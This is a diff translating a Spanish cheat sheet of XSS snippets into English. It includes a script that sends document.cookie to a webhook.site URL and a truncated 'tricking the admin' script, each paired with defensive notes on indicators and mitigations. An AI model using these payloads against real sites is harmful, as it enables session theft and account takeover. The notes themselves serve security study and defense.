@@ -1,10 +1,10 @@
-# Scripts XSS ( e incluso XSS + CSRF)
+# Scripts XSS ( included XSS + CSRF)
 
 ---
 
 ### Snippets (referencia)
 
-- **Engañar al admin**
+- **Tricking the admin**
     
     ```jsx
     <script>
@@ -20,22 +20,21 @@
     </script>
     ```
     
-    **Para defensa**
+**For defense**
     
-    - Qué indica: uso de `fetch` con `credentials: 'include'` sugiere acceso a recursos autenticados desde un contexto no previsto.
-    - Qué revisar: endpoints sensibles sin protección, controles de origen, y exposición de datos en HTML.
-    - Mitigación típica: *output encoding* + CSP + validar origen + reducir datos sensibles en respuestas.
-- **Robar cookies**
+    - What it indicates: Use of `fetch` with `credentials: ‘include’` suggests access to authenticated resources from an unintended context.
+    - What to review: unprotected sensitive endpoints, origin checks, and data exposure in HTML.
+    - Typical mitigation: output encoding + CSP + validate origin + reduce sensitive data in responses.
+- **Stealing cookies**
     
     ```jsx
     <script>fetch("[https://webhook.site/f61526b5-cc7f-4a8e-9e8b-bc022e532818?cookie=](https://webhook.site/f61526b5-cc7f-4a8e-9e8b-bc022e532818?cookie=)" + document.cookie)</script>
     ```
     
-    **Para defensa**
-    
-    - Qué indica: exfiltración vía petición a dominio externo.
-    - Qué revisar: cookies con flags (`HttpOnly`, `Secure`, `SameSite`), CSP `connect-src`, y presencia de XSS.
-    - Mitigación típica: `HttpOnly` (evita lectura por JS), `SameSite`, CSP estricta, sanitización/encoding, y WAF si aplica.
+    **For defense**    
+    - What it indicates: exfiltration via request to external domain.
+    - What to check: cookies with flags (`HttpOnly`, `Secure`, `SameSite`), CSP `connect-src`, and presence of XSS.
+    - Typical mitigation: `HttpOnly` (prevents reading by JS), `SameSite`, strict CSP, sanitization/encoding, and WAF if applicable.
 - **Conseguir componente url**
     
     ```jsx
